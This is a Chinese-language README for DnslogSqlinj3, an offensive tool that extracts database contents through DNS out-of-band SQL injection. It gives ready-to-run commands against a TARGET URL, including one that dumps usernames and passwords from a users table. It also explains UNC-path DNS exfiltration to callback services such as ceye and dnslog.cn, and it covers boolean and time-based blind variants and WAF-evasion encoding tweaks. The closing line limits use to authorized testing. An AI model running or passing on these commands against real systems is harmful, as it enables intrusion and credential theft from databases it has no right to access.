# DnslogSqlinj3

现代 DNS 带外 SQL 注入工具（原版 DnslogSqlinj 的第三代重写）。Python 3.8+，单文件，零依赖。

原版 [DnslogSqlinj](https://github.com/ADOOO/DnslogSqlinj)（2019，py2，ceye 硬编码，仅 MySQL）的非官方重写：一次解析搬 30 字节，四种数据库、四种平台、三种技术。

## 安装

```bash
git clone https://github.com/Pluck9527/DnslogSqlinj3 && cd DnslogSqlinj3
python3 dnslogsqlinj3.py --help        # 直接跑
pip install . && dnslogsqlinj3 --help  # 或装成命令
```

## 用法

```bash
# 1) 离线自检
python3 dnslogsqlinj3.py --self-test

# 2) 回调通道体检（领域名 → 探针解析 → 平台确认）
python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --check

# 3) 探路：确认注入点闭合正确
python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" --expr "select 0x414243"

# 4) 脱库
python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
  --expr "select group_concat(username,0x3a,password) from users"
```

## 三种技术

| 技术 | 命令 | 每字符请求 | 依赖 |
|---|---|---|---|
| DNS HEX 带外（默认） | 直接跑 | 1 次搬 30 字节 | FILE 权限 + 出 DNS |
| DNS 布尔 | `--blind` | 7 | FILE 权限 + 出 DNS |
| SLEEP 时间盲注 | `--technique time` | 7 × samples | 只要 SQL 能跑 |

默认 provider 就是 `ceye`（`--token` + `--ident`）。ceye 的 DNS 入库偶尔延迟到 30~60 秒，脚本会自动重投一次并打印等待心跳，不用干等。

## 支持

- **数据库**：`mysql` `mssql` `oracle` `postgres`
- **平台**：`dnslog.cn` / `ceye`（`--token --ident`）/ `dnsloggo`（`--base --token`）/ `cmd`（自定义命令）
- **参数**：`--prefix`（默认 `AND `）、`--encode auto|strict`、`--chunk`、`--http-timeout`、`--sleep-delay`、`--samples`

## 速度

实测（同一台 Windows + MySQL，ceye）：

| 场景 | 耗时 |
|---|---|
| `select database()` 8 字节 | 2.6 秒 |
| 爆表 29 字节 | 3.3 秒 |
| users 全表 188 字节 | 22.9 秒 |

三个参数决定速度，默认值已经调好：

| 参数 | 默认 | 说明 |
|---|---|---|
| `--http-timeout` | 3 | UNC 会让请求挂在 SMB 连接上，DNS 早发出了。3 秒掐断即可，设 15 反而慢 5 倍 |
| `--chunk` | 30 | hex 后 60 字符，卡在 DNS label 63 上限内。45 视平台可试，60 以上域名过长会失败 |
| `--poll` | 1 | 平台轮询间隔 |
| `--threads` | 1 | 并发块数，默认 1；目标 Apache worker 少时并发会被排队，反而更慢 |

## 踩过的坑（已内置）

1. 全量 URL 编码把 `/ " ( )` 变成 `%2F %22 %28`，会被部分 WAF 断连 → 默认只编码空格与 `& # % +`。
2. MySQL 在某些 Windows 上只对 `//host/share/x.txt` 发起解析，反斜杠 UNC 直接返回 NULL。
3. `%PAYLOAD%` 只替换表达式，缺 `AND` 会拼出语法错 → `--prefix` 默认 `AND `。
4. ceye 对带 `filter` 的记录查询有缓存，首次查空后几十秒都返回空 → 默认不加 filter，拉最近记录本地匹配。

## 测试

```bash
python3 -m unittest discover -s tests -t . -v   # 24 个用例，全离线
```

## 声明

仅用于你有明确授权的测试环境。MIT License，与原作者无关。
